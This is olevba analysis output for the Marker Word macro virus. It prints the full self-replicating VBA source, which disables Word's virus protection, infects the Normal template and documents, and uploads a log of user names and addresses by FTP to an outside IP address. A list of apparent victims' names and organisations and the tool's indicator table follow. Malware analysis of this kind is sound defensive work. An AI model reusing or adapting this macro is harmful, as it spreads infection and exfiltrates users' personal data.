olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-b064c697db45abc975bd7811939f88ac9683817c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-b064c697db45abc975bd7811939f88ac9683817c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 03:07:26 PM - Tuesday, 22 Dec 1998
' BCBSA
'



' 03:28:02 PM - Wednesday, 6 Jan 1999
' BCBSA
'



' 02:59:47 PM - Monday, 11 Jan 1999
' Marsha Veach
'



' 01:54:54 PM - Wednesday, 20 Jan 1999
' Connie Sandifer, CMP
'



' 09:33:06 PM - Monday, 25 Jan 1999
' Doug Rowan
'



' 08:21:12 AM - Wednesday, 27 Jan 1999
' IMSI
'



' 10:59:58 AM - Friday, 29 Jan 1999
' Raj
'



' 03:37:57 PM - Saturday, 30 Jan 1999
' hornd
'



' 01:26:48 PM - Tuesday, 2 Feb 1999
' Cooley Godward
'



' 04:57:29 PM - Tuesday, 2 Feb 1999
' Cooley Godward
'



' 06:35:44 PM - Tuesday, 2 Feb 1999
' Cooley Godward
'



' 04:23:52 PM - Thursday, 4 Feb 1999
' Cooley Godward
'



' 04:27:39 PM - Saturday, 6 Feb 1999
' Cooley Godward
'



' 06:18:06 PM - Monday, 8 Feb 1999
' Cooley Godward
'



' 09:17:17 PM - Tuesday, 9 Feb 1999
' hclee
'



' 04:44:45 PM - Wednesday, 17 Feb 1999
' Dr. W. Hsiao
'                   Wendy Hsiao, Ph.D.



' 04:13:19 PM - Tuesday, 23 Feb 1999
' CCST
'



' 10:09:35 AM - Saturday, 20 Mar 1999
' cpwu
'



' 09:33:49 AM - Thursday, 6 May 1999
' 柳建华
'



' 12:39:25 PM - Tuesday, 20 May 1997
' ghc-bbc
'



' 01:21:36 PM - Friday, 7 May 1999
' 李晋闽
'



' 05:51:53  - Wednesday, 12 May 1999
' qdzhuang
'



' 03:23:04 PM - Saturday, 19 Jun 1999
' 李晋闽
'



' 02:53:46 下午 - Tuesday, 6 Sep 2011
' 李晋闽
'



' 08:49:50 上午 - Friday, 9 Sep 2011
' unknown
'



' 09:19:14 上午 - Friday, 16 Sep 2011
' unknown
'



' 11:26:16 上午 - Monday, 26 Sep 2011
' 曹永胜
'



' 04:33:05 下午 - Monday, 26 Sep 2011
' unknown
'



' 09:03:43 上午 - Tuesday, 11 Oct 2011
' 微软用户
'



' 11:31:18 上午 - Monday, 17 Oct 2011
' 张士力
'



' 12:18:08 下午 - Friday, 21 Oct 2011
' 张士力
'



' 05:01:58 下午 - Monday, 7 Nov 2011
' unknown
'



' 05:09:38 下午 - Wednesday, 9 Nov 2011
' unknown
'



' 04:37:34 下午 - Thursday, 10 Nov 2011
' 杨利斌
'



' 01:48:02 下午 - Monday, 14 Nov 2011
' unknown
'



' 05:31:06 下午 - Wednesday, 30 Nov 2011
' unknown
'



' 04:12:12 下午 - Monday, 5 Dec 2011
' 陈伟
'



' 10:21:39 上午 - Thursday, 15 Dec 2011
' 赵岩
'



' 03:00:14 下午 - Wednesday, 8 Feb 2012
' Administrator
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

